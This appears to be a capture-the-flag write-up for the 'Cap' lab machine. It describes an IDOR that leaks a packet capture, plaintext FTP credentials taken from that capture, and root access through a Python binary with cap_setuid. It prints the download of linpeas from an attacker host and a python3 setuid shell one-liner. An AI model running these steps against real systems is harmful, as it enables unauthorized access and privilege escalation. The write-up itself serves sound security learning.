#### Cap

**About:**  
Cap is an easy difficulty Linux machine running an HTTP server that performs administrative functions, including generating network captures. Improper controls result in an Insecure Direct Object Reference (`IDOR`), giving access to another user's capture. The capture contains plaintext credentials and can be used to gain a foothold. A Linux capability is then leveraged to escalate to root.

**Process:**  
An initial `nmap <targetIP>` revealed three open TCP ports: `SSH`, `FTP`, and `HTTP`. Visiting `http://<targetIP>` revealed a web UI containing a security dashboard. Navigating through it revealed a URL structure like `http://<targetIP>/data/<ID#>`. Manually changing the ID number allowed access to other users' capture pages. Navigating to `/data/0` allowed the download of a `.pcap` file which, when examined in Wireshark, showed `FTP` traffic. Following the TCP stream revealed a login for user `nathan` with the password `Buck3tH4TF0RM3!` in plaintext.

Attempting to log in with Nathan’s credentials via `ssh nathan@<targetIP>` succeeded. Running `ls` revealed `user.txt`, which contained the first flag. Nathan was not a member of `sudoers`, and no immediate escalation path was obvious, so `linpeas.sh` was used to identify potential privilege escalation vectors. Downloading it directly with `curl` from GitHub was unsuccessful, so `python3 -m http.server 8081` was started from the directory containing `linpeas.sh` on the attacking machine. From there, `curl http://<attackerIP>:8081/linpeas.sh -o linpeas.sh` was run on Nathan’s machine to download the script.

Next, `chmod +x linpeas.sh` was used, and `./linpeas.sh` was run to execute it. Once complete, the “Processes with capabilities” section revealed `/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip`. With that identified, `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'` was run from Nathan’s account, resulting in escalation to root. Investigation of `/` revealed `root.txt`, which contained the final flag.
